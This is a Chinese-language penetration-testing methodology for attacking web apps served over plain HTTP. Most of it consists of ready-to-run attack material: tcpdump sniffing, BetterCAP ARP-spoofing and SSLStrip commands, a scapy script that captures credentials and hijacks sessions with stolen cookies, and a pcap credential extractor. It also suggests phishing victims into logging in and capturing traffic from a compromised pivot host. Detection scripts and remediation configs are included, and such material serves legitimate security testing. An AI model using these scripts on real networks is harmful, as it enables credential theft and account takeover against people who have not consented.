# HTTP-only 部署凭证拦截攻击方法论

---

# 第一部分：文档概述

## 1.1 编写目的
本文档旨在为渗透测试人员提供一套标准化的 HTTP-only 部署凭证拦截（HTTP-Only Deployment Credential Interception）攻击检测与利用流程，针对应用程序未配置 HTTPS/TLS 加密导致敏感数据明文传输的缺陷进行系统性测试与利用。

## 1.2 适用范围
本文档适用于以下场景：
- Web 应用仅使用 HTTP 协议（端口 80）
- 未配置 HTTPS/TLS 加密
- 缺少 HSTS 响应头
- Cookie 缺少 Secure 标志
- 登录接口明文传输凭证
- 会话 Cookie 明文传输
- 同一网络段可实施中间人攻击

## 1.3 读者对象
本文件主要面向执行渗透测试任务的安全工程师、安全分析师。

---

# 第二部分：核心渗透技术专题

## 2.1 技术介绍

### 漏洞原理

**HTTP-only 部署凭证拦截（HTTP-Only Deployment Credential Interception）**：应用程序未配置 HTTPS/TLS 加密，所有通信（包括登录凭证、会话 Cookie、敏感数据）通过 HTTP 明文传输，攻击者可在同一网络段通过流量嗅探、中间人攻击等方式截获敏感信息。

**本质问题**：
- 未使用传输层加密（TLS/SSL）
- 缺少强制 HTTPS 重定向
- Cookie 未设置 Secure 标志
- 缺少 HSTS 响应头
- 网络通信无加密保护

### 典型漏洞配置

```apache
# Apache 配置 - 仅监听 HTTP 端口
<VirtualHost *:80>
    ServerName target.com
    # 缺少 SSL 配置
    # 无 HTTPS 重定向
</VirtualHost>
```

```python
# Flask 应用配置
app.config.update(
    # 缺少以下配置
    # SESSION_COOKIE_SECURE = True  # Cookie 仅通过 HTTPS 传输
    # PREFERRED_URL_SCHEME = 'https'  # 生成 HTTPS URL
)
```

```yaml
# Docker Compose 配置
services:
  web:
    ports:
      - "80:80"  # 仅暴露 HTTP 端口
      # 缺少 443:443 HTTPS 端口
```

### 常见 CWE 映射

| CWE 编号 | 描述 |
|---------|------|
| CWE-319 | 明文传输敏感信息 |
| CWE-311 | 缺少加密保护 |
| CWE-757 | 选择较弱或不足够安全的加密算法 |

## 2.2 攻击常见于哪些业务场景

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| 内部开发环境 | 本地测试应用 | 无 HTTPS 配置，凭证明文传输 |
| CTF 挑战应用 | 安全培训环境 | 故意配置 HTTP-only 供学员利用 |
| 遗留系统 | 老旧 Web 应用 | 未升级到 HTTPS |
| 容器化部署 | Docker 应用 | 默认配置仅 HTTP |
| 快速原型 | MVP 产品 | 优先功能开发忽略安全配置 |
| 内网应用 | 内部管理系统 | 认为内网安全无需加密 |

### 高风险特征

1. **网络服务特征**
   ```bash
   # 仅监听 HTTP 端口
   $ nmap target.com
   PORT   STATE SERVICE
   80/tcp open  http    # 无 443 端口
   ```

2. **响应头特征**
   ```http
   HTTP/1.1 200 OK
   # 缺少 Strict-Transport-Security
   # 缺少 HTTPS 重定向
   ```

3. **Cookie 特征**
   ```http
   Set-Cookie: session=abc123; Path=/
   # 缺少 Secure 标志
   # 缺少 HttpOnly 标志
   ```

## 2.3 漏洞探测方法

### 2.3.1 黑盒测试

#### 步骤 1：检测 HTTPS 可用性

```bash
# 方法 1：nmap 扫描
nmap -sV --script ssl-enum-ciphers -p 443 target.com
# 无 443 端口开放表示无 HTTPS

# 方法 2：curl 测试
curl -I https://target.com/
# curl: (7) Failed to connect to target.com port 443: Connection refused

# 方法 3：SSL Labs 测试
# 访问 https://www.ssllabs.com/ssltest/ 输入目标域名
```

#### 步骤 2：检测 HTTP 明文传输

```bash
# 方法 1：Wireshark/tcpdump 抓包
sudo tcpdump -i any -s 0 -w capture.pcap host target.com and port 80

# 方法 2：登录过程抓包
# 1. 开始抓包
sudo tcpdump -i any -s 0 -w login.pcap port 80

# 2. 执行登录
curl -X POST http://target.com/login \
    -d "username=test&password=test123"

# 3. 停止抓包（Ctrl+C）

# 4. 分析抓包文件
tcpdump -r login.pcap -A | grep -E "username|password"
# 输出明文凭证
```

#### 步骤 3：检测 Cookie 安全标志

```bash
# 方法 1：curl 查看响应头
curl -I -X POST http://target.com/login \
    -d "username=test&password=test"

# 输出示例（不安全）
Set-Cookie: session=eyJ1c2VyX2lkIjoiMTAwMzIifQ...; Path=/
# 缺少 Secure 标志

# 输出示例（安全）
Set-Cookie: session=abc123; Secure; HttpOnly; SameSite=Lax
```

#### 步骤 4：检测 HSTS 配置

```bash
# 方法 1：检查响应头
curl -I https://target.com/ 2>/dev/null | grep -i strict-transport

# 无输出表示未配置 HSTS

# 方法 2：使用 hstspreload 检查
curl https://hstspreload.org/api/v2/status/target.com
# 返回 {"status": "unknown"} 表示未加入预加载列表
```

### 2.3.2 自动化检测脚本

```python
#!/usr/bin/env python3
"""
HTTP-only 部署检测脚本
检测目标是否仅使用 HTTP 而无 HTTPS 配置
"""

import requests
import argparse
import socket
import ssl

class HTTPOnlyDetector:
    def __init__(self, target):
        self.target = target.rstrip('/')
        self.domain = self.target.replace('http://', '').replace('https://', '').split('/')[0]

    def check_https_port(self):
        """检查 HTTPS 端口是否开放"""
        print(f"[*] Checking HTTPS port (443)...")

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            result = sock.connect_ex((self.domain, 443))
            sock.close()

            if result == 0:
                print(f"[+] Port 443 is OPEN")
                return True
            else:
                print(f"[-] Port 443 is CLOSED")
                return False
        except Exception as e:
            print(f"[-] Error checking port 443: {e}")
            return False

    def check_https_response(self):
        """检查 HTTPS 响应"""
        print(f"[*] Checking HTTPS response...")

        try:
            # 尝试 HTTP 连接
            http_url = self.target if self.target.startswith('http://') else f'http://{self.target}'
            https_url = http_url.replace('http://', 'https://')

            session = requests.Session()
            session.verify = False  # 忽略证书验证错误

            response = session.get(https_url, timeout=10, allow_redirects=False)

            print(f"[+] HTTPS responded: {response.status_code}")

            # 检查是否重定向到 HTTPS
            if response.status_code in [301, 302]:
                location = response.headers.get('Location', '')
                if location.startswith('https://'):
                    print(f"[+] Redirects to HTTPS: {location}")
                    return True

            return True

        except requests.exceptions.SSLError:
            print(f"[-] HTTPS SSL/TLS error (may have self-signed cert)")
            return True  # HTTPS exists but has cert issues
        except requests.exceptions.ConnectionError:
            print(f"[-] HTTPS connection failed")
            return False
        except Exception as e:
            print(f"[-] Error: {e}")
            return False

    def check_security_headers(self):
        """检查安全响应头"""
        print(f"[*] Checking security headers...")

        try:
            url = self.target if self.target.startswith('http://') else f'http://{self.target}'
            response = requests.get(url, timeout=10)

            headers = response.headers

            # 检查 HSTS
            hsts = headers.get('Strict-Transport-Security')
            if hsts:
                print(f"[+] HSTS configured: {hsts}")
            else:
                print(f"[-] HSTS NOT configured")

            # 检查 HTTPS 重定向
            if response.url.startswith('https://'):
                print(f"[+] Auto-redirects to HTTPS")
            else:
                print(f"[-] No HTTPS redirect")

            return {
                'hsts': bool(hsts),
                'https_redirect': response.url.startswith('https://')
            }

        except Exception as e:
            print(f"[-] Error checking headers: {e}")
            return None

    def check_cookie_flags(self):
        """检查 Cookie 安全标志"""
        print(f"[*] Checking cookie security flags...")

        try:
            url = self.target if self.target.startswith('http://') else f'http://{self.target}'

            # 尝试登录获取 Cookie
            session = requests.Session()

            # 尝试常见登录端点
            login_endpoints = ['/login', '/auth', '/signin', '/api/login']

            for endpoint in login_endpoints:
                try:
                    response = session.post(
                        f'{url}{endpoint}',
                        data={'username': 'test', 'password': 'test'},
                        timeout=5
                    )

                    cookies = response.headers.get('Set-Cookie', '')
                    if cookies:
                        print(f"[+] Found cookies: {cookies[:100]}...")

                        # 检查 Secure 标志
                        if 'Secure' in cookies:
                            print(f"[+] Cookie has Secure flag")
                        else:
                            print(f"[-] Cookie MISSING Secure flag")

                        # 检查 HttpOnly 标志
                        if 'HttpOnly' in cookies:
                            print(f"[+] Cookie has HttpOnly flag")
                        else:
                            print(f"[-] Cookie MISSING HttpOnly flag")

                        return {
                            'secure': 'Secure' in cookies,
                            'httponly': 'HttpOnly' in cookies
                        }

                except:
                    continue

            print(f"[-] No cookies found")
            return None

        except Exception as e:
            print(f"[-] Error checking cookies: {e}")
            return None

    def detect_http_only_deployment(self):
        """执行完整检测"""
        print(f"[*] Detecting HTTP-only deployment for {self.target}\n")

        https_port_open = self.check_https_port()
        https_works = self.check_https_response()
        headers = self.check_security_headers()
        cookies = self.check_cookie_flags()

        print(f"\n[*] Summary:")
        print(f"    HTTPS Port (443): {'Open' if https_port_open else 'Closed'}")
        print(f"    HTTPS Works: {'Yes' if https_works else 'No'}")
        print(f"    HSTS: {'Yes' if headers and headers.get('hsts') else 'No'}")
        print(f"    HTTPS Redirect: {'Yes' if headers and headers.get('https_redirect') else 'No'}")
        print(f"    Cookie Secure: {'Yes' if cookies and cookies.get('secure') else 'No'}")
        print(f"    Cookie HttpOnly: {'Yes' if cookies and cookies.get('httponly') else 'No'}")

        # 判断是否 HTTP-only 部署
        is_http_only = (
            not https_port_open or
            not https_works or
            (headers and not headers.get('hsts')) or
            (cookies and not cookies.get('secure'))
        )

        if is_http_only:
            print(f"\n[+] Target appears to be HTTP-ONLY DEPLOYMENT")
            print(f"[+] Credentials transmitted in PLAINTEXT")
            print(f"[+] Vulnerable to credential interception")
        else:
            print(f"\n[-] Target appears to have HTTPS configured")

        return is_http_only

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", required=True, help="Target URL or domain")
    args = parser.parse_args()

    detector = HTTPOnlyDetector(args.target)
    detector.detect_http_only_deployment()

if __name__ == '__main__':
    main()
```

### 2.3.3 白盒测试

#### 代码/配置审计检查点

```bash
# 1. 检查 Web 服务器配置
grep -r "listen.*80" /etc/apache2/ /etc/nginx/
grep -r "listen.*443" /etc/apache2/ /etc/nginx/
grep -r "ssl_certificate" /etc/apache2/ /etc/nginx/

# 2. 检查应用配置
grep -r "SESSION_COOKIE_SECURE" --include="*.py"
grep -r "PREFERRED_URL_SCHEME" --include="*.py"
grep -r "SECURE_SSL_REDIRECT" --include="*.py"

# 3. 检查 Docker 配置
grep -r "ports:" docker-compose.yml
grep -r "EXPOSE" Dockerfile

# 4. 检查 HTTPS 重定向
grep -r "301" --include="*.py" --include="*.conf"
grep -r "redirect.*https" --include="*.py"
```

#### 漏洞配置模式

```apache
# 危险配置 - 仅 HTTP
<VirtualHost *:80>
    ServerName example.com
    # 无 SSL 配置
    # 无 HTTPS 重定向
</VirtualHost>

# 正确配置 - HTTPS + 重定向
<VirtualHost *:80>
    ServerName example.com
    Redirect permanent / https://example.com/
</VirtualHost>

<VirtualHost *:443>
    ServerName example.com
    SSLEngine on
    SSLCertificateFile /path/to/cert.pem
    SSLCertificateKeyFile /path/to/key.pem

    # HSTS 头
    Header always set Strict-Transport-Security "max-age=31536000"
</VirtualHost>
```

```python
# 危险配置 - Flask
app.config['SESSION_COOKIE_SECURE'] = False  # 允许 HTTP 传输 Cookie

# 正确配置
app.config['SESSION_COOKIE_SECURE'] = True  # 仅 HTTPS 传输
app.config['PREFERRED_URL_SCHEME'] = 'https'  # 生成 HTTPS URL
```

## 2.4 漏洞利用方法

### 2.4.1 流量嗅探攻击

**适用场景**：攻击者与目标在同一网络段（同一 WiFi、交换机）

**工具**：Wireshark、tcpdump、BetterCAP

**步骤**：

```bash
# 步骤 1：开始抓包
sudo tcpdump -i en0 -s 0 -w capture.pcap host target.com and port 80

# 步骤 2：诱使目标登录（或等待自然登录）
# 方法：发送钓鱼邮件、访问恶意链接等

# 步骤 3：停止抓包（Ctrl+C）

# 步骤 4：提取明文凭证
strings capture.pcap | grep -E "username|password"

# 或使用 Wireshark 分析
wireshark capture.pcap
# 过滤器：http.request.method == "POST"
# 查看 POST 数据中的 username 和 password
```

### 2.4.2 ARP 欺骗中间人攻击

**适用场景**：局域网环境，可实施 ARP 欺骗

**工具**：BetterCAP、Ettercap

**步骤**：

```bash
# 使用 BetterCAP 进行 ARP 欺骗 + HTTP 监控

# 步骤 1：启动 BetterCAP
sudo bettercap -iface en0

# 步骤 2：启用 ARP 欺骗
> set arp.spoof.targets 192.168.1.100  # 目标 IP
> arp.spoof on

# 步骤 3：启用 HTTP 监控
> set http.proxy.script /path/to/monitor.cap
> http.proxy on

# 步骤 4：监控流量
# BetterCAP 将显示所有 HTTP 流量，包括明文凭证
```

### 2.4.3 Cookie 劫持攻击

```python
#!/usr/bin/env python3
"""
HTTP-only 部署 Cookie 劫持脚本
通过嗅探获取会话 Cookie 并劫持账户
"""

import requests
import re
from scapy.all import *

class CookieHijacker:
    def __init__(self, interface, target_ip, target_domain):
        self.interface = interface
        self.target_ip = target_ip
        self.target_domain = target_domain
        self.cookies = []

    def packet_callback(self, packet):
        """回调函数处理每个数据包"""
        if TCP in packet and Raw in packet:
            payload = packet[Raw].load.decode('utf-8', errors='ignore')

            # 查找 Set-Cookie 头
            if 'Set-Cookie:' in payload and self.target_domain in payload:
                cookie_match = re.search(r'Set-Cookie:\s*([^\r\n]+)', payload)
                if cookie_match:
                    cookie = cookie_match.group(1)
                    print(f"[+] Captured Cookie: {cookie}")
                    self.cookies.append(cookie)

            # 查找登录凭证
            if 'username=' in payload and 'password=' in payload:
                print(f"[+] Captured Credentials:")
                print(f"    {payload[:500]}")

    def start_sniffing(self, duration=60):
        """开始嗅探"""
        print(f"[*] Starting cookie hijacking...")
        print(f"[*] Interface: {self.interface}")
        print(f"[*] Target: {self.target_ip}")
        print(f"[*] Duration: {duration} seconds")

        sniff(
            iface=self.interface,
            filter=f"host {self.target_ip} and port 80",
            prn=self.packet_callback,
            timeout=duration
        )

        return self.cookies

    def hijack_session(self, cookie):
        """使用劫持的 Cookie 访问账户"""
        # 提取 Cookie 值
        cookie_value = re.search(r'session=([^;]+)', cookie)
        if not cookie_value:
            return None

        session = requests.Session()
        session.cookies.set('session', cookie_value.group(1))

        # 访问仪表板
        response = session.get(f'http://{self.target_domain}/dashboard')

        if response.status_code == 200:
            print(f"[+] Session hijacking successful!")
            return response.text

        return None

def main():
    import argparse

    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", required=True, help="Network interface")
    parser.add_argument("-t", "--target-ip", required=True, help="Target IP address")
    parser.add_argument("-d", "--domain", required=True, help="Target domain")
    parser.add_argument("--duration", type=int, default=60, help="Sniffing duration")
    args = parser.parse_args()

    hijacker = CookieHijacker(args.interface, args.target_ip, args.domain)
    cookies = hijacker.start_sniffing(duration=args.duration)

    # 尝试劫持会话
    for cookie in cookies:
        print(f"[*] Attempting session hijack...")
        hijacker.hijack_session(cookie)

if __name__ == '__main__':
    main()
```

### 2.4.4 批量凭证提取

```python
#!/usr/bin/env python3
"""
从抓包文件中批量提取凭证
"""

import re
import argparse
from scapy.all import rdpcap, TCP, Raw

def extract_credentials_from_pcap(pcap_file):
    """从 pcap 文件提取凭证"""

    print(f"[*] Reading {pcap_file}...")
    packets = rdpcap(pcap_file)

    credentials = []

    for packet in packets:
        if TCP in packet and Raw in packet:
            try:
                payload = packet[Raw].load.decode('utf-8', errors='ignore')

                # 查找 POST 请求中的凭证
                if 'POST' in payload:
                    # 提取 username 和 password
                    username_match = re.search(r'username=([^&\r\n]+)', payload)
                    password_match = re.search(r'password=([^&\r\n]+)', payload)

                    if username_match and password_match:
                        from urllib.parse import unquote
                        username = unquote(username_match.group(1))
                        password = unquote(password_match.group(1))

                        credentials.append({
                            'username': username,
                            'password': password,
                            'src_ip': packet['IP'].src,
                            'dst_ip': packet['IP'].dst
                        })

                        print(f"[+] Found credentials:")
                        print(f"    Username: {username}")
                        print(f"    Password: {password}")
                        print(f"    Source: {packet['IP'].src}")

            except Exception as e:
                continue

    print(f"\n[*] Extracted {len(credentials)} credential pairs")
    return credentials

def extract_cookies_from_pcap(pcap_file):
    """从 pcap 文件提取 Cookie"""

    print(f"[*] Reading {pcap_file}...")
    packets = rdpcap(pcap_file)

    cookies = []

    for packet in packets:
        if TCP in packet and Raw in packet:
            try:
                payload = packet[Raw].load.decode('utf-8', errors='ignore')

                # 查找 Set-Cookie 头
                if 'Set-Cookie:' in payload:
                    cookie_matches = re.findall(r'Set-Cookie:\s*([^\r\n]+)', payload)

                    for cookie in cookie_matches:
                        cookies.append({
                            'cookie': cookie,
                            'dst_ip': packet['IP'].dst
                        })

                        print(f"[+] Found cookie: {cookie[:100]}...")

            except:
                continue

    print(f"\n[*] Extracted {len(cookies)} cookies")
    return cookies

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-f", "--file", required=True, help="PCAP file")
    parser.add_argument("--extract-cookies", action='store_true', help="Extract cookies only")
    args = parser.parse_args()

    if args.extract_cookies:
        extract_cookies_from_pcap(args.file)
    else:
        extract_credentials_from_pcap(args.file)

if __name__ == '__main__':
    main()
```

## 2.5 漏洞利用绕过方法

### 2.5.1 绕过网络隔离

如果目标在不同 VLAN：

```bash
# 方法：通过 compromised 主机跳转
# 1. 先攻陷一台与目标同网段的主机
# 2. 在该主机上安装抓包工具
# 3. 远程启动抓包

ssh compromised-host "sudo tcpdump -i eth0 -s 0 -w - port 80" > capture.pcap
```

### 2.5.2 绕过加密流量

如果部分流量使用 HTTPS：

```bash
# 方法：SSLStrip 降级攻击
# 将 HTTPS 连接降级为 HTTP

# 使用 BetterCAP
> set https.server.port 8080
> set http.proxy.port 8081
> https.server on
> http.proxy on

# 或使用 sslstrip
sslstrip -a -w capture.log
```

---

# 第三部分：附录

## 3.1 攻击 Payload 速查表

| 攻击类型 | 工具/命令 | 说明 |
|---------|----------|------|
| 流量嗅探 | `tcpdump -i any -w capture.pcap port 80` | 抓取 HTTP 流量 |
| Wireshark 分析 | `http.request.method == "POST"` | 过滤 POST 请求 |
| ARP 欺骗 | `bettercap -iface en0` | 中间人攻击 |
| Cookie 提取 | `strings capture.pcap \| grep Cookie` | 提取 Cookie |
| 凭证提取 | `strings capture.pcap \| grep password` | 提取密码 |

## 3.2 检测检查清单

```
□ 目标是否仅监听 HTTP 端口（80）
□ HTTPS 端口（443）是否关闭
□ 访问 HTTP 是否不重定向到 HTTPS
□ 响应头是否缺少 HSTS
□ Cookie 是否缺少 Secure 标志
□ 登录过程是否明文传输
□ 会话 Cookie 是否明文传输
□ 同一网络段是否可抓包
```

## 3.3 修复建议

### Web 服务器配置

```apache
# Apache HTTPS 配置
<VirtualHost *:443>
    ServerName example.com

    SSLEngine on
    SSLCertificateFile /path/to/cert.pem
    SSLCertificateKeyFile /path/to/key.pem

    # HSTS
    Header always set Strict-Transport-Security "max-age=31536000; includeSubDomains"

    # 安全 Cookie 标志
    Header always set Set-Cookie "Secure; HttpOnly; SameSite=Lax"
</VirtualHost>

# HTTP 重定向到 HTTPS
<VirtualHost *:80>
    ServerName example.com
    Redirect permanent / https://example.com/
</VirtualHost>
```

### Flask 应用配置

```python
# 安全配置
app.config.update(
    SESSION_COOKIE_SECURE=True,        # 仅 HTTPS 传输 Cookie
    SESSION_COOKIE_HTTPONLY=True,      # 禁止 JavaScript 访问
    SESSION_COOKIE_SAMESITE='Lax',     # CSRF 保护
    PREFERRED_URL_SCHEME='https',      # 生成 HTTPS URL
    SECURE_SSL_REDIRECT=True           # 强制 HTTPS
)
```

### Docker 配置

```yaml
# docker-compose.yml
services:
  web:
    ports:
      - "443:443"  # HTTPS
      - "80:80"    # HTTP (用于重定向)
    environment:
      - HTTPS_ENABLED=true
```

## 3.4 参考资源

- [OWASP Transport Layer Protection](https://cheatsheetseries.owasp.org/cheatsheets/Transport_Layer_Protection_Cheat_Sheet.html)
- [OWASP HTTP Security Headers](https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Headers_Cheat_Sheet.html)
- [HSTS Preload](https://hstspreload.org/)
- [SSL Labs Test](https://www.ssllabs.com/ssltest/)
